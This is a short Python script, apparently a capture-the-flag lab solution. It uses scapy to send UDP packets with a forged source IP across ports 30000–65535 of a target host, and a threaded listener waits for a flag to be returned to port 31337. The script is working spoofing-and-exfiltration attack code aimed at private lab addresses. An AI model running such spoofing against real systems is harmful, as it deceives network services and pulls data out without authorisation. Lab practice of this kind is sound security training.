# send scapy spoofed packets. Have a listener on python. 
# It may need to be done in one script/terminal because of this:
# user_host.interactive(environ=parent_process.environ()) <-- restricts to one environment
from scapy.all import *
import threading, socket

def listener():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind(("0.0.0.0",31337))
    data, addr = s.recvfrom(1024)
    print(f'received from {addr}: {data}')

t = threading.Thread(target=listener)
t.start()

for i in range(30000, 65536): # reasonable port range
    pkt = IP(dst='10.0.0.2',src='10.0.0.3')/UDP(sport=31337, dport=i)/b'FLAG:10.0.0.1:31337'
    send(pkt, iface='eth0', verbose=False)

t.join()
